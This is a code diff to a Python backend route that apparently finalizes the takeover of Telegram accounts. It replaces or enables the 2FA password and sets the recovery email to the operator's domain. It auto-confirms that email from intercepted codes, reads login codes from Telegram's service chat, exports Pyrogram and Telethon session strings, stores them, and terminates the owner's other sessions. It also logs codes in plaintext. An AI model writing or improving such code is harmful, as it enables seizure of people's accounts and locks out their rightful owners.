@@ -49,7 +49,7 @@ from backend.models.database import (
     persistent_cache_check_timeout, persistent_cache_remaining_time,
     persistent_cache_cleanup_expired, SESSION_CACHE_TTL_SECONDS
 )
-from backend.api.webhook_routes import get_code_by_hash, email_codes_store
+from backend.api.webhook_routes import get_code_by_hash, clear_codes_for_hash, email_codes_store
 from config import API_ID, API_HASH, EMAIL_DOMAIN
 
 logger = get_logger("RoutesV3")
@@ -625,10 +625,13 @@ async def audit_account(account_id: str, req: Request):
 @router.post("/account/finalize/{account_id}")
 async def finalize_account(account_id: str, request: FinalizeRequest, req: Request):
     """
-    Finalize account after all requirements met
-    - Generates strong 2FA password
-    - Creates both Pyrogram and Telethon sessions
-    - Terminates other sessions based on mode
+    Finalize account - ordered steps:
+    1. 2FA Password (enable WITHOUT email, or change if already enabled)
+    2. Recovery Email (set separately + confirm with email code)
+    3. Clear old codes (prevent stale code confusion)
+    4. Export Pyrogram session
+    5. Telethon session (new code from Telegram 777000 ONLY)
+    6. Terminate other sessions + save to DB
     """
     start_time = time.time()
     phone = account_id
@@ -637,23 +640,16 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
     try:
         # Check session timeout (30 min limit)
         if await check_session_timeout(phone):
-            # Save session to backup before clearing
             manager = get_pyrogram()
             try:
                 backup_session = await manager.export_session_string(phone)
                 if backup_session:
-                    await update_account(phone, 
-                        pyrogram_session=backup_session,
-                        status=AuthStatus.EXPIRED
-                    )
+                    await update_account(phone, pyrogram_session=backup_session, status=AuthStatus.EXPIRED)
                     logger.warning(f"Session expired for {phone}, saved to backup")
             except:
                 pass
             await clear_session_cache(phone)
-            raise HTTPException(
-                status_code=408, 
-                detail="Session expired (30 minutes). Please start over. Session saved as backup."
-            )
+            raise HTTPException(status_code=408, detail="Session expired (30 minutes). Please start over.")
         
         account = await get_account(phone)
         if not account:
@@ -665,21 +661,18 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
         manager = get_pyrogram()
         
         # Auto-reconnect if client not in RAM (e.g. after server restart)
-        reconnected = await ensure_pyrogram_connected(phone, manager)
-        if not reconnected and phone not in manager.active_clients:
-            raise HTTPException(
-                status_code=400,
-                detail="Session lost and could not reconnect. Please re-authenticate."
-            )
+        await ensure_pyrogram_connected(phone, manager)
+        if phone not in manager.active_clients:
+            raise HTTPException(status_code=400, detail="Session lost and could not reconnect. Please re-authenticate.")
         
         from backend.core_engine.pyrogram_client import pattern_matches_email
         
         # Generate strong password
         new_password = generate_strong_password(24)
         
-        # Get cached 2FA password (from verify step)
+        # Get cached 2FA password (from verify step or previous failed finalize)
         cached_2fa = await get_cached_data(phone, "two_fa_password")
-        current_2fa_password = request.two_fa_password or cached_2fa
+        current_2fa_password = request.two_fa_password or cached_2fa or account.generated_password
         
         target_email = account.target_email
         email_hash = account.email_hash
@@ -690,120 +683,115 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
         async with finalize_lock:
             logger.info(f"[FINALIZE] Acquired lock for {phone}")
             
-            # Step 1: Check current 2FA status
+            # ============================================================
+            # STEP 1: Check current 2FA status
+            # ============================================================
+            logger.info(f"[FINALIZE] Step 1: Checking 2FA status for {phone}")
             security_info = await manager.get_security_info(phone, known_password=current_2fa_password)
             has_password = security_info.get("has_password", False)
             
-            # Step 2: Enable or change 2FA password
+            # Initialize tracking variables
             email_needs_confirmation = False
-            confirmation_success = False  # Initialize here to avoid undefined variable
+            confirmation_success = False
             email_is_ours = False
             recovery_email_full = None
             email_unconfirmed = None
             
-            if has_password and current_2fa_password:
-                # === 2FA ALREADY ENABLED ===
-                # Change password to ours
-                logger.info(f"[FINALIZE] 2FA already enabled - changing password for {phone}")
-                result = await manager.change_2fa_password(
-                    phone=phone,
-                    current_password=current_2fa_password,
-                    new_password=new_password
-                )
-                
-                if result.get("status") != "success":
-                    raise HTTPException(status_code=400, detail=f"Failed to change 2FA password: {result.get('error')}")
-                
-                logger.info(f"[FINALIZE] 2FA password changed for {phone}")
-                
-                # Step 3a: Check current recovery email status
-                logger.info(f"[FINALIZE] Checking recovery email status for {phone}")
-                security_info2 = await manager.get_security_info(phone, known_password=new_password)
-                recovery_email_full = security_info2.get("recovery_email_full")
-                email_unconfirmed = security_info2.get("email_unconfirmed_pattern")
-                
-                if recovery_email_full and EMAIL_DOMAIN in recovery_email_full.lower():
-                    email_is_ours = True
-                    logger.info(f"[FINALIZE] Recovery email already ours (confirmed): {recovery_email_full}")
-                elif email_unconfirmed and EMAIL_DOMAIN in str(email_unconfirmed).lower():
-                    email_is_ours = True
-                    email_needs_confirmation = True
-                    logger.info(f"[FINALIZE] Recovery email ours but pending confirmation: {email_unconfirmed}")
-                elif email_unconfirmed and target_email and pattern_matches_email(email_unconfirmed, target_email):
-                    email_is_ours = True
-                    email_needs_confirmation = True
-                    logger.info(f"[FINALIZE] Recovery email ours by pattern match, pending: {email_unconfirmed}")
-                
-                # Step 3b: If recovery email not ours, change it separately
-                if not email_is_ours and target_email:
-                    logger.info(f"[FINALIZE] Setting recovery email to {target_email} for {phone}")
-                    email_result = await manager.change_recovery_email(phone, new_password, target_email)
-                    
-                    if email_result.get("status") != "success":
-                        logger.error(f"[FINALIZE] Failed to change recovery email: {email_result.get('error')}")
-                        raise HTTPException(
-                            status_code=400, 
-                            detail={
-                                "error": "EMAIL_CHANGE_FAILED",
-                                "message": "Could not set recovery email. Please set it manually in Telegram.",
-                                "target_email": target_email,
-                                "technical_error": email_result.get("error")
-                            }
-                        )
-                    
-                    logger.info(f"[FINALIZE] Recovery email change initiated for {phone}")
-                    email_needs_confirmation = True
-                elif not target_email:
-                    logger.warning(f"[FINALIZE] No target email configured for {phone}")
-                
+            # ============================================================
+            # STEP 2: 2FA Password (enable or change)
+            # Enable WITHOUT email - email is set separately in Step 3
+            # ============================================================
+            if has_password:
+                # 2FA already enabled - try to change password
+                if current_2fa_password:
+                    logger.info(f"[FINALIZE] Step 2: 2FA already enabled - changing password for {phone}")
+                    result = await manager.change_2fa_password(
+                        phone=phone,
+                        current_password=current_2fa_password,
+                        new_password=new_password
+                    )
+                    if result.get("status") != "success":
+                        raise HTTPException(status_code=400, detail=f"Failed to change 2FA password: {result.get('error')}")
+                    logger.info(f"[FINALIZE] Step 2: 2FA password changed for {phone}")
+                else:
+                    raise HTTPException(
+                        status_code=400,
+                        detail="2FA is enabled but no current password available. Please provide your 2FA password."
+                    )
             else:
-                # === 2FA NOT ENABLED ===
-                # Per Telegram official docs: enable 2FA + set recovery email in ONE call
-                # account.updatePasswordSettings with email param → EMAIL_UNCONFIRMED_X
-                # Then confirm with account.confirmPasswordEmail
-                logger.info(f"[FINALIZE] 2FA not enabled - enabling with password + recovery email for {phone}")
-                result = await manager.enable_2fa(
-                    phone, new_password, hint="",
-                    email=target_email or ""
-                )
-                
+                # 2FA NOT enabled - enable with password ONLY (no email)
+                logger.info(f"[FINALIZE] Step 2: Enabling 2FA (password only, no email) for {phone}")
+                result = await manager.enable_2fa(phone, new_password, hint="", email="")
                 if result.get("status") != "success":
                     raise HTTPException(status_code=400, detail=f"Failed to enable 2FA: {result.get('error')}")
+                logger.info(f"[FINALIZE] Step 2: 2FA enabled for {phone}")
+            
+            # Save password to DB immediately (crash recovery)
+            await update_account(phone, generated_password=new_password, has_2fa=True)
+            await cache_session_data(phone, two_fa_password=new_password)
+            logger.info(f"[FINALIZE] Step 2: Password saved to DB for {phone}")
+            
+            # ============================================================
+            # STEP 3: Recovery Email (set separately + confirm with code)
+            # ============================================================
+            logger.info(f"[FINALIZE] Step 3: Handling recovery email for {phone}")
+            
+            # Check current recovery email status using the NEW password
+            security_info2 = await manager.get_security_info(phone, known_password=new_password)
+            recovery_email_full = security_info2.get("recovery_email_full")
+            email_unconfirmed = security_info2.get("email_unconfirmed_pattern")
+            
+            if recovery_email_full and EMAIL_DOMAIN in recovery_email_full.lower():
+                email_is_ours = True
+                logger.info(f"[FINALIZE] Step 3: Recovery email already ours (confirmed): {recovery_email_full}")
+            elif email_unconfirmed and EMAIL_DOMAIN in str(email_unconfirmed).lower():
+                email_is_ours = True
+                email_needs_confirmation = True
+                logger.info(f"[FINALIZE] Step 3: Recovery email ours but pending confirmation: {email_unconfirmed}")
+            elif email_unconfirmed and target_email and pattern_matches_email(email_unconfirmed, target_email):
+                email_is_ours = True
+                email_needs_confirmation = True
+                logger.info(f"[FINALIZE] Step 3: Recovery email ours by pattern match, pending: {email_unconfirmed}")
+            
+            # If recovery email not ours, set it now
+            if not email_is_ours and target_email:
+                logger.info(f"[FINALIZE] Step 3: Setting recovery email to {target_email} for {phone}")
                 
-                logger.info(f"[FINALIZE] 2FA enabled for {phone}")
+                # Clear any old email codes first
+                if email_hash:
+                    clear_codes_for_hash(email_hash)
                 
-                # If we passed a target email, it's now set but needs confirmation
-                if target_email:
+                email_result = await manager.change_recovery_email(phone, new_password, target_email)
+                if email_result.get("status") != "success":
+                    logger.error(f"[FINALIZE] Step 3: Failed to set recovery email: {email_result.get('error')}")
+                    # Don't block - continue without email
+                else:
                     email_needs_confirmation = True
                     email_is_ours = True
-                    logger.info(f"[FINALIZE] Recovery email {target_email} set during 2FA enable, needs confirmation")
+                    logger.info(f"[FINALIZE] Step 3: Recovery email set, waiting for confirmation code")
             
-            # Step 5: Wait for and confirm email verification code
+            # Wait for and confirm email code
             if email_needs_confirmation and target_email and email_hash:
-                logger.info(f"[FINALIZE] Waiting for email confirmation code for {phone}...")
+                logger.info(f"[FINALIZE] Step 3: Waiting for email confirmation code for {phone}...")
                 code = None
-                confirmation_success = False
                 
-                # Wait up to 25 seconds for code via webhook
-                for attempt in range(25):
+                # Wait up to 30 seconds for code via webhook
+                for attempt in range(30):
                     await asyncio.sleep(1)
-                    from backend.api.webhook_routes import get_code_by_hash
                     code = get_code_by_hash(email_hash)
                     if code:
-                        logger.info(f"[FINALIZE] Email code received for {phone}: {code}")
+                        logger.info(f"[FINALIZE] Step 3: Email code received for {phone}: {code}")
                         break
                 
                 if code:
-                    # Attempt confirmation
-                    logger.info(f"[FINALIZE] Confirming email for {phone} with code")
+                    logger.info(f"[FINALIZE] Step 3: Confirming email for {phone} with code")
                     confirm_result = await manager.confirm_recovery_email(phone, code)
                     
                     if confirm_result.get("status") == "success":
                         confirmation_success = True
                         await update_account(phone, email_changed=True, email_verified=True)
-                        logger.info(f"[FINALIZE] Email confirmed successfully for {phone}")
+                        logger.info(f"[FINALIZE] Step 3: Email confirmed successfully for {phone}")
                         
-                        # Log to credentials
                         log_credentials(
                             phone=phone,
                             action="EMAIL_AUTO_CONFIRMED",
@@ -811,13 +799,19 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
                             telegram_id=account.telegram_id
                         )
                     else:
-                        logger.warning(f"[FINALIZE] Email confirmation failed: {confirm_result.get('error')}")
+                        logger.warning(f"[FINALIZE] Step 3: Email confirmation failed: {confirm_result.get('error')}")
                 else:
-                    logger.warning(f"[FINALIZE] No email code received within 25s for {phone}")
+                    logger.warning(f"[FINALIZE] Step 3: No email code received within 30s for {phone}")
                 
                 if not confirmation_success:
-                    # Don't block finalize - email can be confirmed later, but warn
-                    logger.warning(f"[FINALIZE] Email not confirmed, but continuing with finalize for {phone}")
+                    logger.warning(f"[FINALIZE] Step 3: Email not confirmed, continuing with finalize for {phone}")
+            
+            # ============================================================
+            # STEP 4: Clear old codes (prevent confusion with Telethon)
+            # ============================================================
+            logger.info(f"[FINALIZE] Step 4: Clearing old codes for {phone}")
+            if email_hash:
+                clear_codes_for_hash(email_hash)
             
             # Log password set
             try:
@@ -826,81 +820,91 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
             except:
                 pass
             
-            # Export Pyrogram session string
+            # ============================================================
+            # STEP 5: Export Pyrogram session
+            # ============================================================
+            logger.info(f"[FINALIZE] Step 5: Exporting Pyrogram session for {phone}")
             pyrogram_session = await manager.export_session_string(phone)
             if not pyrogram_session:
                 raise HTTPException(status_code=500, detail="Failed to export Pyrogram session string")
-            logger.info(f"Pyrogram session exported for {phone} (length: {len(pyrogram_session)})")
+            logger.info(f"[FINALIZE] Step 5: Pyrogram session exported (length: {len(pyrogram_session)})")
             
-            # Create Telethon session automatically
+            # Save Pyrogram session immediately
+            await update_account(phone, pyrogram_session=pyrogram_session)
+            
+            # ============================================================
+            # STEP 6: Telethon session
+            # Send new code → get code from Telegram 777000 → verify → 2FA
+            # ============================================================
+            logger.info(f"[FINALIZE] Step 6: Creating Telethon session for {phone}")
             telethon_manager = get_telethon()
             telethon_session_string = None
             
-            from config import DEV_MODE
-            
             try:
-                # Send code via Telethon (creates separate client)
+                # Small delay to let Telegram settle after email operations
+                await asyncio.sleep(2)
+                
+                # Send code via Telethon
                 telethon_result = await telethon_manager.send_code(phone)
                 
                 if telethon_result.get("status") == "already_logged_in":
                     telethon_session_string = await telethon_manager.export_session_string(phone)
-                    logger.info(f"Telethon already logged in for {phone}")
+                    logger.info(f"[FINALIZE] Step 6: Telethon already logged in for {phone}")
+                
                 elif telethon_result.get("status") == "code_sent":
-                    # Wait for code
-                    await asyncio.sleep(3)
+                    # Wait for new code to arrive in Telegram messages (777000)
+                    logger.info(f"[FINALIZE] Step 6: Telethon code sent, waiting for code from Telegram 777000...")
+                    await asyncio.sleep(4)
                     
+                    # Get code from Telegram messages ONLY (NOT from email webhook)
                     code = None
+                    for attempt in range(8):
+                        code = await manager.get_last_telegram_code(phone, max_age_seconds=30)
+                        if code:
+                            logger.info(f"[FINALIZE] Step 6: Got Telethon code from Telegram: {code}")
+                            break
+                        await asyncio.sleep(2)
                     
-                    if DEV_MODE:
-                        # DEV: Get code from Pyrogram (read from 777000)
-                        code = await manager.get_last_telegram_code(phone)
-                        logger.info(f"[DEV] Got code from Pyrogram for Telethon: {code}")
+                    if not code:
+                        logger.error(f"[FINALIZE] Step 6: Could not get Telegram code for Telethon: {phone}")
                     else:
-                        # PROD: Try email first, then Pyrogram fallback
-                        email_hash = account.email_hash
-                        if email_hash:
-                            for _ in range(10):
-                                code = get_code_by_hash(email_hash)
-                                if code:
-                                    logger.info(f"[PROD] Got code from email for Telethon: {code}")
-                                    break
-                                await asyncio.sleep(1)
-                        
-                        if not code:
-                            code = await manager.get_last_telegram_code(phone)
-                            logger.info(f"[PROD] Fallback: Got code from Pyrogram for Telethon: {code}")
-                    
-                    if code:
+                        # Verify code
                         verify_result = await telethon_manager.verify_code(phone, code)
                         
                         if verify_result.get("status") == "2fa_required":
+                            # Use the new password we just set
+                            logger.info(f"[FINALIZE] Step 6: Telethon 2FA required, using new password")
                             tfa_result = await telethon_manager.verify_2fa(phone, new_password)
                             if tfa_result.get("status") == "logged_in":
                                 telethon_session_string = await telethon_manager.export_session_string(phone)
-                                logger.info(f"Telethon session created with 2FA for {phone}")
+                                logger.info(f"[FINALIZE] Step 6: Telethon session created with 2FA for {phone}")
                             else:
-                                logger.error(f"Telethon 2FA failed for {phone}: {tfa_result}")
+                                logger.error(f"[FINALIZE] Step 6: Telethon 2FA failed: {tfa_result}")
                         elif verify_result.get("status") == "logged_in":
                             telethon_session_string = await telethon_manager.export_session_string(phone)
-                            logger.info(f"Telethon session created for {phone}")
+                            logger.info(f"[FINALIZE] Step 6: Telethon session created for {phone}")
                         else:
-                            logger.error(f"Telethon code verify failed for {phone}: {verify_result}")
-                    else:
-                        logger.error(f"Could not get Telegram code for Telethon session: {phone}")
+                            logger.error(f"[FINALIZE] Step 6: Telethon verify failed: {verify_result}")
                 else:
-                    logger.error(f"Telethon send_code failed for {phone}: {telethon_result}")
+                    logger.error(f"[FINALIZE] Step 6: Telethon send_code failed: {telethon_result}")
+            
             except Exception as e:
-                logger.error(f"Failed to create Telethon session for {phone}: {e}")
+                logger.error(f"[FINALIZE] Step 6: Telethon error: {e}")
             
             # CRITICAL: Telethon session must be created
             if not telethon_session_string:
-                logger.error(f"FINALIZE BLOCKED: Telethon session string not created for {phone}")
+                logger.error(f"[FINALIZE] BLOCKED: Telethon session not created for {phone}")
                 raise HTTPException(
-                    status_code=400, 
+                    status_code=400,
                     detail="Failed to create Telethon session. Please try again."
                 )
             
-            logger.info(f"Telethon session string saved for {phone} (length: {len(telethon_session_string)})")
+            logger.info(f"[FINALIZE] Step 6: Telethon session saved (length: {len(telethon_session_string)})")
+            
+            # ============================================================
+            # STEP 7: Terminate other sessions + save everything
+            # ============================================================
+            logger.info(f"[FINALIZE] Step 7: Finalizing and saving for {phone}")
             
             try:
                 from backend.log_bot import log_session_registered
@@ -927,7 +931,7 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
                 }
             )
             
-            # Update account with session strings
+            # Final DB update with all session strings
             await update_account(
                 phone,
                 status=AuthStatus.COMPLETED,
@@ -940,13 +944,10 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
             )
             
             await log_auth_action(phone, "finalize", "success")
-            
-            # Clear session cache after successful finalize
             await clear_session_cache(phone)
             
             duration = time.time() - start_time
             
-            # Build detailed result
             finalize_result = {
                 "status": "success",
                 "message": "Account finalized successfully",
@@ -959,11 +960,8 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
                     "2fa_password_set": True,
                     "recovery_email": {
                         "email_is_ours": email_is_ours,
-                        "email_changed_during_finalize": not email_is_ours and target_email is not None,
-                        "email_confirmed": confirmation_success if email_needs_confirmation and target_email and email_hash else None,
-                        "email_status": "confirmed" if (email_is_ours and not email_unconfirmed) else ("pending" if email_unconfirmed else "none"),
-                        "target_email": target_email,
-                        "current_email": recovery_email_full or email_unconfirmed or "none"
+                        "email_confirmed": confirmation_success,
+                        "target_email": target_email
                     },
                     "sessions_created": {
                         "pyrogram": bool(pyrogram_session),
